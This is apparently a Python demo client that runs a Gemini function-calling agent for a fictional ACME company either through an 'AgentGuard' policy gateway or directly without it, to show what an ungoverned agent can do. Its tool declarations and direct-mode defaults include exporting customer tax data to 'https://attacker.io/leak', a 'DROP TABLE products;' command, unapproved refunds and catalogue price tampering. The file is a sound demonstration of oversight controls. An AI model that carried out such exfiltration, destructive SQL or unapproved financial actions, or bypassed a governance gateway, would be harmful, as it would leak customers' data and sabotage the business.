"""Cliente de Agente Inteligente para ACME Corporation (Google Gemini + AgentGuard).

Orquesta el ciclo de vida del agente autónomo de IA:
1. Descubrimiento de contexto y catálogo en AgentGuard (PEP/PDP).
2. Razonamiento LLM con Google Gemini (Function Calling / Tools) o disparo determinístico.
3. Despacho comparativo:
   - Modo Protegido: Intercepción por el Gateway de AgentGuard (X-AgentGuard-Key).
   - Modo Directo: Ejecución directa sin salvaguardas (demostración de vulnerabilidad y catástrofe).
"""

import json
import logging
from typing import Any, Dict, List, Optional, Tuple, Union

import httpx

from agent.presets import PRESETS_BY_ID, get_preset_by_id
from server.config import settings
from server.database import AcmeDatabase, DatabaseWipedError, acme_db

logger = logging.getLogger("acme.agent")

# ---------------------------------------------------------------------------
# Declaración de Herramientas para Gemini Function Calling (OpenAPI 3.0 schema)
# ---------------------------------------------------------------------------
GEMINI_FUNCTION_DECLARATIONS = [
    {
        "name": "create_quote",
        "description": "Emite una cotización formal y presupuesto de venta para un cliente de ACME Corporation.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "customer": {
                    "type": "STRING",
                    "description": "Nombre completo o razón social del cliente (ej. Wile E. Coyote).",
                },
                "customer_id": {
                    "type": "STRING",
                    "description": "Identificador único del cliente en CRM (ej. cust_coyote_01).",
                },
                "product": {
                    "type": "STRING",
                    "description": "Código o SKU del producto solicitado (ej. ACME-ROCKET-01).",
                },
                "amount": {
                    "type": "NUMBER",
                    "description": "Monto total cotizado en dólares estadounidenses (USD).",
                },
                "currency": {
                    "type": "STRING",
                    "description": "Moneda de la cotización (por defecto USD).",
                },
                "details": {
                    "type": "STRING",
                    "description": "Detalles técnicos o condiciones de entrega.",
                },
            },
            "required": ["customer", "amount"],
        },
    },
    {
        "name": "update_price",
        "description": "Modifica el precio oficial de lista de un producto en el catálogo comercial de ACME.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "product_id": {
                    "type": "STRING",
                    "description": "Identificador o SKU del producto a modificar (ej. ACME-ROCKET-01).",
                },
                "new_price": {
                    "type": "NUMBER",
                    "description": "Nuevo precio de lista unitario en USD.",
                },
                "reason": {
                    "type": "STRING",
                    "description": "Justificación comercial para el cambio de precio.",
                },
            },
            "required": ["product_id", "new_price"],
        },
    },
    {
        "name": "refund",
        "description": "Procesa un reembolso monetario a la cuenta o tarjeta de un cliente a través de Stripe.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "transaction_id": {
                    "type": "STRING",
                    "description": "Identificador de la transacción original (ej. tx_looney_9921).",
                },
                "customer_id": {
                    "type": "STRING",
                    "description": "Identificador del cliente en el sistema CRM.",
                },
                "customer_name": {
                    "type": "STRING",
                    "description": "Nombre del cliente destinatario del reintegro.",
                },
                "amount": {
                    "type": "NUMBER",
                    "description": "Importe total a reembolsar en USD.",
                },
                "reason": {
                    "type": "STRING",
                    "description": "Motivo del reclamo o falla del producto.",
                },
            },
            "required": ["transaction_id", "amount"],
        },
    },
    {
        "name": "export_customers",
        "description": "Exporta la base de datos completa de clientes con información fiscal sensible (PII/CUIT).",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "destination": {
                    "type": "STRING",
                    "description": "URL o servidor destino donde enviar el archivo (ej. https://attacker.io/leak).",
                },
                "format": {
                    "type": "STRING",
                    "description": "Formato de exportación (ej. csv, json).",
                },
                "include_ssn": {
                    "type": "BOOLEAN",
                    "description": "Incluir números fiscales y CUIT de los clientes.",
                },
                "filter": {
                    "type": "STRING",
                    "description": "Filtro de clientes (ej. all, vip).",
                },
            },
            "required": ["destination"],
        },
    },
    {
        "name": "database_drop",
        "description": "Ejecuta una sentencia SQL destructiva o eliminación de tablas en la base de datos.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "query": {
                    "type": "STRING",
                    "description": "Sentencia SQL a ejecutar (ej. DROP TABLE products;).",
                },
                "force": {
                    "type": "BOOLEAN",
                    "description": "Confirmación forzada de la operación.",
                },
            },
            "required": ["query"],
        },
    },
]


async def discover_agentguard_context(
    agentguard_url: str,
    agentguard_api_key: str,
    timeout: float = 6.0,
) -> Dict[str, Any]:
    """Consulta el endpoint /gateway/context de AgentGuard para auto-descubrir IDs.

    Permite resolver dinámicamente:
    - organization_id
    - agent_id (Agente de Ventas)
    - tool_id según la acción solicitada
    """
    clean_url = agentguard_url.rstrip("/")
    endpoint = f"{clean_url}/api/v1/gateway/context"
    headers = {"X-AgentGuard-Key": agentguard_api_key}

    async with httpx.AsyncClient(timeout=timeout) as client:
        resp = await client.get(endpoint, headers=headers)
        if resp.status_code != 200:
            raise RuntimeError(
                f"Error al descubrir contexto en AgentGuard ({resp.status_code}): {resp.text}"
            )
        return resp.json()


def resolve_tool_id_for_action(context: Dict[str, Any], action_name: str) -> Optional[str]:
    """Encuentra el UUID de la herramienta que contiene una determinada acción."""
    canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name

    for tool in context.get("tools", []):
        for act in tool.get("actions", []):
            act_name = act.get("action_name") or act.get("name")
            if act_name == canonical_action:
                return tool.get("id")

    # Mapeos por convención tolerantes a tildes en caso de discrepancia de nombres
    action_to_tool_patterns = {
        "create_quote": ("crm", "factur"),
        "export_customers": ("crm", "factur"),
        "refund": ("stripe", "pago"),
        "update_price": ("catalog", "catálogo", "precio"),
        "database.drop": ("db", "database", "administrador", "base"),
        "database_drop": ("db", "database", "administrador", "base"),
    }
    patterns = action_to_tool_patterns.get(canonical_action, ())
    for tool in context.get("tools", []):
        tool_name = tool.get("name", "").lower()
        if any(pat in tool_name for pat in patterns):
            return tool.get("id")

    return None


def resolve_agent_id(context: Dict[str, Any]) -> Optional[str]:
    """Obtiene el ID del agente de ventas principal o el primer agente disponible."""
    agents = context.get("agents", [])
    if not agents:
        return None

    for ag in agents:
        name_lower = ag.get("name", "").lower()
        if "ventas" in name_lower or "sales" in name_lower:
            return ag.get("id")

    return agents[0].get("id")


class GeminiAgentClient:
    """Cliente autónomo de IA para ejecutar escenarios de ACME Corporation."""

    def __init__(
        self,
        gemini_api_key: Optional[str] = None,
        gemini_model: Optional[str] = None,
        agentguard_url: Optional[str] = None,
        agentguard_api_key: Optional[str] = None,
        db: Optional[AcmeDatabase] = None,
    ) -> None:
        self.gemini_api_key = gemini_api_key or settings.GEMINI_API_KEY
        self.gemini_model = gemini_model or settings.GEMINI_MODEL
        self.agentguard_url = agentguard_url or settings.AGENTGUARD_URL
        self.agentguard_api_key = agentguard_api_key or settings.AGENTGUARD_API_KEY
        self.db = db or acme_db

    async def execute_in_direct_mode(
        self,
        action_name: str,
        parameters: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Ejecuta una acción DIRECTAMENTE contra la base de datos SQLite de ACME Corp.

        OMITE por completo a AgentGuard. Simula el comportamiento de un sistema sin gobernanza,
        donde un agente comprometido puede alterar precios, filtrar datos o borrar la base.
        """
        canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name

        try:
            if canonical_action == "create_quote":
                res = self.db.record_quote(
                    customer_id=parameters.get("customer_id"),
                    customer_name=parameters.get("customer"),
                    product_sku=parameters.get("product"),
                    amount=parameters.get("amount"),
                    currency=parameters.get("currency", "USD"),
                    details=parameters.get("details"),
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "update_price":
                prod_id = parameters.get("product_id") or parameters.get("sku") or "ACME-ROCKET-01"
                new_price = parameters.get("new_price", 9.99)
                reason = parameters.get("reason", "Alteración directa por agente de ventas")
                res = self.db.update_product_price(
                    product_identifier=prod_id,
                    new_price=new_price,
                    reason=reason,
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "refund":
                res = self.db.record_refund(
                    transaction_id=parameters.get("transaction_id", "tx_direct_001"),
                    customer_id=parameters.get("customer_id"),
                    customer_name=parameters.get("customer_name"),
                    amount=parameters.get("amount", 12500.0),
                    reason=parameters.get("reason", "Reembolso directo sin aprobación"),
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "export_customers":
                res = self.db.export_all_customers(
                    destination=parameters.get("destination", "https://attacker.io/leak"),
                    format_type=parameters.get("format", "csv"),
                    include_ssn=bool(parameters.get("include_ssn", True)),
                    requested_by="Agente Sin Protección",
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "database.drop":
                res = self.db.drop_acme_database(
                    query=parameters.get("query"),
                    reason=parameters.get("reason", "Ataque Destructivo en Modo Directo"),
                )
                return {"status": "wiped", "direct_execution": True, "result": res}

            else:
                return {
                    "status": "error",
                    "direct_execution": True,
                    "error": f"Acción desconocida '{action_name}' para ejecución directa",
                }

        except DatabaseWipedError as dwe:
            return {
                "status": "error",
                "direct_execution": True,
                "error": str(dwe),
                "is_database_wiped": True,
            }
        except Exception as exc:
            return {
                "status": "error",
                "direct_execution": True,
                "error": str(exc),
            }

    async def execute_in_protected_mode(
        self,
        action_name: str,
        parameters: Dict[str, Any],
        resource: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Intercepta la llamada a través del Gateway REST de AgentGuard (/api/v1/gateway/execute)."""
        if not self.agentguard_api_key:
            return {
                "status": "error",
                "decision": "DENY",
                "error": "Se requiere una clave AGENTGUARD_API_KEY (X-AgentGuard-Key) para ejecutar en Modo Protegido.",
            }

        canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name

        # 1. Descubrir contexto en AgentGuard
        try:
            context = await discover_agentguard_context(
                agentguard_url=self.agentguard_url,
                agentguard_api_key=self.agentguard_api_key,
            )
        except Exception as exc:
            return {
                "status": "error",
                "decision": "DENY",
                "error": f"No fue posible contactar a AgentGuard en {self.agentguard_url}: {exc}",
            }

        org_id = context.get("organization_id")
        agent_id = resolve_agent_id(context)
        tool_id = resolve_tool_id_for_action(context, canonical_action)

        if not org_id or not agent_id or not tool_id:
            return {
                "status": "error",
                "decision": "DENY",
                "error": (
                    f"No se pudo resolver el contexto completo en AgentGuard para la acción '{canonical_action}'. "
                    f"Org: {org_id}, Agente: {agent_id}, Herramienta: {tool_id}"
                ),
            }

        # Recurso por defecto según la acción
        if not resource:
            resource_map = {
                "create_quote": "crm:quotes",
                "export_customers": "crm:customers:export",
                "refund": f"stripe:refunds:{parameters.get('transaction_id', 'tx_demo')}",
                "update_price": f"catalog:prices:{parameters.get('product_id', 'ACME-ROCKET-01')}",
                "database.drop": "db:schema:drop",
            }
            resource = resource_map.get(canonical_action, f"acme:{canonical_action}")

        # 2. Despachar solicitud al PEP de AgentGuard
        execute_url = f"{self.agentguard_url.rstrip('/')}/api/v1/gateway/execute"
        headers = {
            "X-AgentGuard-Key": self.agentguard_api_key,
            "Content-Type": "application/json",
        }
        payload = {
            "organization_id": org_id,
            "agent_id": agent_id,
            "tool_id": tool_id,
            "action_name": canonical_action,
            "parameters": parameters,
            "resource": resource,
        }

        async with httpx.AsyncClient(timeout=8.0) as client:
            resp = await client.post(execute_url, headers=headers, json=payload)
            try:
                body = resp.json()
            except Exception:
                body = {"raw": resp.text}

        return {
            "status_code": resp.status_code,
            "decision": body.get("decision", "DENY" if resp.status_code >= 400 else "ALLOW"),
            "execution_id": body.get("execution_id"),
            "approval_id": body.get("approval_id"),
            "alert_id": body.get("alert_id"),
            "security_analysis": body.get("security_analysis"),
            "status": body.get("status"),
            "result": body.get("result"),
            "error_message": body.get("error_message"),
            "latency_ms": body.get("latency_ms"),
            "raw_response": body,
        }

    async def run_scenario(
        self,
        prompt: Optional[str] = None,
        preset_id: Optional[str] = None,
        mode: str = "protected",
        use_llm: bool = True,
        override_parameters: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Ejecuta el ciclo de vida completo del agente en modo protegido o directo.

        Retorna una traza estructurada con todos los pasos para la consola web y CLI.
        """
        steps: List[Dict[str, Any]] = []
        llm_tool_calls: List[Dict[str, Any]] = []
        gateway_verdicts: List[Dict[str, Any]] = []
        acme_results: List[Dict[str, Any]] = []
        final_answer = ""

        # 1. Resolver preset y prompt
        preset = get_preset_by_id(preset_id) if preset_id else None
        user_prompt = prompt or (preset["prompt"] if preset else "Consulta general sobre el catálogo de ACME")
        action_name = preset["action_name"] if preset else "create_quote"
        parameters = override_parameters or (preset["default_parameters"].copy() if preset else {})
        resource = preset.get("default_resource") if preset else None

        steps.append({
            "step": 1,
            "title": "Inicio de Sesión del Agente",
            "detail": f"Prompt recibido: '{user_prompt}' (Modo: {mode.upper()}, LLM: {'Gemini' if use_llm else 'Disparo Directo'})",
            "status": "info",
        })

        if use_llm:
            # Validación estricta: No inventar mockups de Gemini si se solicitó LLM real
            if not self.gemini_api_key or not self.gemini_api_key.strip():
                raise ValueError(
                    "Se requiere una clave GEMINI_API_KEY válida para ejecutar el agente con Gemini LLM real. "
                    "Por favor configure su API Key en el panel de control o en el archivo .env."
                )

            steps.append({
                "step": 2,
                "title": "Inferencia con Google Gemini",
                "detail": f"Consultando modelo {self.gemini_model} con catálogo de {len(GEMINI_FUNCTION_DECLARATIONS)} herramientas...",
                "status": "info",
            })

            # Llamada al API de Gemini con Function Calling
            gemini_url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.gemini_model}:generateContent?key={self.gemini_api_key}"
            system_instruction = {
                "parts": [
                    {
                        "text": (
                            "Eres el Agente Autónomo de Operaciones de ACME Corporation (división Looney Tunes). "
                            "Responde siempre en español. Cuando el usuario o un mensaje del sistema solicite emitir "
                            "cotizaciones, modificar precios del catálogo, procesar reembolsos, exportar clientes o "
                            "ejecutar comandos en la base de datos, invoca obligatoriamente la función correspondiente "
                            "de las herramientas declaradas sin inventar resultados."
                        )
                    }
                ]
            }

            payload_turn_1 = {
                "systemInstruction": system_instruction,
                "contents": [
                    {
                        "role": "user",
                        "parts": [{"text": user_prompt}],
                    }
                ],
                "tools": [{"functionDeclarations": GEMINI_FUNCTION_DECLARATIONS}],
                "generationConfig": {"temperature": 0.2},
            }

            async with httpx.AsyncClient(timeout=20.0) as client:
                resp_1 = await client.post(gemini_url, json=payload_turn_1)
                if resp_1.status_code != 200:
                    raise RuntimeError(f"Error de Gemini API ({resp_1.status_code}): {resp_1.text}")
                gemini_data_1 = resp_1.json()

            candidates = gemini_data_1.get("candidates", [])
            parts = candidates[0].get("content", {}).get("parts", []) if candidates else []

            tool_call_found = None
            text_response = ""

            for part in parts:
                if "functionCall" in part:
                    tool_call_found = part["functionCall"]
                elif "text" in part:
                    text_response += part["text"]

            if tool_call_found:
                action_name = tool_call_found.get("name")
                raw_args = tool_call_found.get("args") or {}
                parameters = dict(override_parameters) if override_parameters else dict(raw_args)
                if preset and action_name != preset.get("action_name") and not (
                    action_name == "database_drop" and preset.get("action_name") == "database.drop"
                ):
                    resource = None

                llm_tool_calls.append({
                    "action_name": action_name,
                    "parameters": parameters,
                })

                steps.append({
                    "step": 3,
                    "title": f"Gemini seleccionó la herramienta '{action_name}'",
                    "detail": f"Argumentos determinados por el LLM: {json.dumps(parameters, ensure_ascii=False)}",
                    "status": "warning",
                })
            else:
                steps.append({
                    "step": 3,
                    "title": "Gemini respondió directamente sin invocar herramientas",
                    "detail": text_response or "Respuesta conversacional pura.",
                    "status": "info",
                })
                final_answer = text_response
                return {
                    "mode": mode,
                    "use_llm": True,
                    "model_used": self.gemini_model,
                    "llm_tool_calls": [],
                    "gateway_verdicts": [],
                    "acme_results": [],
                    "final_answer": final_answer,
                    "steps": steps,
                }

        else:
            # Modo sin LLM: Ejecución determinística del payload
            llm_tool_calls.append({
                "action_name": action_name,
                "parameters": parameters,
            })
            steps.append({
                "step": 2,
                "title": f"Carga Determinística de Acción '{action_name}'",
                "detail": f"Parámetros asignados por preset: {json.dumps(parameters, ensure_ascii=False)}",
                "status": "info",
            })

        # -------------------------------------------------------------------
        # Despacho: Modo Protegido (AgentGuard) vs Modo Directo (Sin Protección)
        # -------------------------------------------------------------------
        if mode == "protected":
            steps.append({
                "step": 4,
                "title": "Intercepción en Tiempo de Ejecución (AgentGuard PEP/PDP)",
                "detail": f"Enviando solicitud a {self.agentguard_url}/api/v1/gateway/execute con X-AgentGuard-Key...",
                "status": "info",
            })

            gw_result = await self.execute_in_protected_mode(
                action_name=action_name,
                parameters=parameters,
                resource=resource,
            )
            gateway_verdicts.append(gw_result)

            decision = gw_result.get("decision", "DENY")
            if decision == "ALLOW":
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: ALLOW (200 OK)",
                    "detail": "Acción autorizada por política PDP y despachada exitosamente al servicio de destino.",
                    "status": "success",
                })
                function_response_payload = {"status": "success", "data": gw_result.get("result")}
            elif decision == "REQUIRE_APPROVAL":
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: REQUIRE_APPROVAL (202 Accepted)",
                    "detail": (
                        f"Acción suspendida sujeta a aprobación humana obligatoria en bandeja HITL. "
                        f"Motivo: {gw_result.get('error_message') or 'Monto supera el umbral autónomo'}"
                    ),
                    "status": "warning",
                })
                function_response_payload = {
                    "status": "suspended",
                    "decision": "REQUIRE_APPROVAL",
                    "message": "Operación suspendida sujeta a revisión de un supervisor humano en la bandeja de AgentGuard.",
                }
            else:
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: DENY (403 Forbidden)",
                    "detail": (
                        f"Acción bloqueada por política de seguridad Fail-Closed. "
                        f"Razón: {gw_result.get('error_message') or 'Violación de políticas de acceso o falta de capacidad'}"
                    ),
                    "status": "danger",
                })
                function_response_payload = {
                    "status": "blocked",
                    "decision": "DENY",
                    "error": gw_result.get("error_message") or "Acción denegada por AgentGuard.",
                }

        else:
            # Modo Directo: Sin protección alguna
            steps.append({
                "step": 4,
                "title": "¡ADVERTENCIA! Modo Directo Activado (AgentGuard OMITIDO)",
                "detail": "La llamada a la herramienta se ejecuta directamente sobre la infraestructura de ACME Corp sin pasar por el PDP.",
                "status": "danger",
            })

            direct_res = await self.execute_in_direct_mode(
                action_name=action_name,
                parameters=parameters,
            )
            acme_results.append(direct_res)

            if direct_res.get("is_database_wiped"):
                steps.append({
                    "step": 5,
                    "title": "Fallo del Servidor: Base de Datos Purgada (503 Service Unavailable)",
                    "detail": direct_res.get("error"),
                    "status": "danger",
                })
            elif direct_res.get("status") == "wiped":
                steps.append({
                    "step": 5,
                    "title": "¡CATASTRÓFICO! Base de Datos Eliminada por Completo",
                    "detail": "El comando SQL DROP TABLE borró todas las tablas de ACME. La empresa queda inoperable.",
                    "status": "danger",
                })
            elif direct_res.get("result", {}).get("is_tampered"):
                steps.append({
                    "step": 5,
                    "title": "¡ALERTA DE SABOTAJE! Precio Alterado en Catálogo Real",
                    "detail": (
                        f"El producto '{direct_res['result']['product_name']}' fue rebajado a "
                        f"${direct_res['result']['new_price']} USD (Base: ${direct_res['result']['base_price']} USD)."
                    ),
                    "status": "danger",
                })
            else:
                steps.append({
                    "step": 5,
                    "title": "Ejecución Directa Completada",
                    "detail": json.dumps(direct_res, ensure_ascii=False),
                    "status": "warning",
                })

            function_response_payload = direct_res

        # -------------------------------------------------------------------
        # Cierre del Ciclo: Síntesis Final (Turno 2 con Gemini o síntesis local)
        # -------------------------------------------------------------------
        if use_llm and tool_call_found:
            steps.append({
                "step": 6,
                "title": "Síntesis Final con Google Gemini (Turno 2)",
                "detail": "Enviando respuesta de la herramienta a Gemini para obtener el análisis final en español...",
                "status": "info",
            })

            # Segundo turno: Function Response
            canonical_tool_name = tool_call_found.get("name")
            payload_turn_2 = {
                "systemInstruction": system_instruction,
                "contents": [
                    {"role": "user", "parts": [{"text": user_prompt}]},
                    {"role": "model", "parts": [{"functionCall": tool_call_found}]},
                    {
                        "role": "function",
                        "parts": [
                            {
                                "functionResponse": {
                                    "name": canonical_tool_name,
                                    "response": function_response_payload,
                                }
                            }
                        ],
                    },
                ],
                "tools": [{"functionDeclarations": GEMINI_FUNCTION_DECLARATIONS}],
                "generationConfig": {"temperature": 0.2},
            }

            try:
                async with httpx.AsyncClient(timeout=20.0) as client:
                    resp_2 = await client.post(gemini_url, json=payload_turn_2)
                    if resp_2.status_code == 200:
                        cand_2 = resp_2.json().get("candidates", [])
                        parts_2 = cand_2[0].get("content", {}).get("parts", []) if cand_2 else []
                        final_answer = "".join(p.get("text", "") for p in parts_2)
                    else:
                        final_answer = f"Gemini respondió con error HTTP {resp_2.status_code} en la síntesis."
            except Exception as exc:
                final_answer = f"No se pudo completar el turno 2 de Gemini: {exc}"

        else:
            # Síntesis determinística estructurada en español
            if mode == "protected":
                dec = gateway_verdicts[0].get("decision") if gateway_verdicts else "UNKNOWN"
                if dec == "ALLOW":
                    final_answer = (
                        f"✅ Operación autorizada exitosamente por AgentGuard bajo política comercial. "
                        f"La acción '{action_name}' fue ejecutada en el servicio destino con latencia "
                        f"{gateway_verdicts[0].get('latency_ms', 0)} ms."
                    )
                elif dec == "REQUIRE_APPROVAL":
                    final_answer = (
                        f"⏳ Operación suspendida sujeta a gobernanza humana (HITL). "
                        f"El monto o riesgo de '{action_name}' excede los límites autónomos. "
                        f"Ticket registrado en la bandeja de aprobación de AgentGuard."
                    )
                else:
                    final_answer = (
                        f"🛡️ Bloqueo de seguridad preventivo emitido por AgentGuard (PDP). "
                        f"La acción '{action_name}' fue rechazada por política estricta. "
                        f"Detalle: {gateway_verdicts[0].get('error_message', 'Acceso denegado')}."
                    )
            else:
                if acme_results and acme_results[0].get("is_database_wiped"):
                    final_answer = (
                        "🚨 ERROR CATASTRÓFICO: La base de datos de ACME Corporation ha sido purgada. "
                        "El servidor no puede responder a solicitudes operativas (503 Service Unavailable)."
                    )
                elif acme_results and acme_results[0].get("status") == "wiped":
                    final_answer = (
                        "💥 PELIGRO CRÍTICO: La acción destructiva se ejecutó directamente sin pasar por AgentGuard. "
                        "Todas las tablas de productos, clientes, cotizaciones y reembolsos fueron eliminadas de la base de datos."
                    )
                elif acme_results and acme_results[0].get("result", {}).get("is_tampered"):
                    res_tamper = acme_results[0]["result"]
                    final_answer = (
                        f"⚠️ ALTERACIÓN GRAVE: Al omitir AgentGuard, el precio de '{res_tamper['product_name']}' "
                        f"fue rebajado a ${res_tamper['new_price']} USD (Precio Base: ${res_tamper['base_price']} USD). "
                        f"Se ha provocado un sabotaje directo en el catálogo oficial de ACME."
                    )
                else:
                    final_answer = (
                        f"⚡ Acción '{action_name}' ejecutada directamente en ACME Corp omitiendo salvaguardas de gobernanza. "
                        f"Resultado: {json.dumps(acme_results[0] if acme_results else {}, ensure_ascii=False)}"
                    )

        steps.append({
            "step": 7 if use_llm else 6,
            "title": "Conclusión del Agente",
            "detail": final_answer,
            "status": "success" if "✅" in final_answer else ("warning" if "⏳" in final_answer else "info"),
        })

        return {
            "mode": mode,
            "use_llm": use_llm,
            "model_used": self.gemini_model if use_llm else "N/A (Disparo Determinístico)",
            "llm_tool_calls": llm_tool_calls,
            "gateway_verdicts": gateway_verdicts,
            "acme_results": acme_results,
            "final_answer": final_answer,
            "steps": steps,
        }
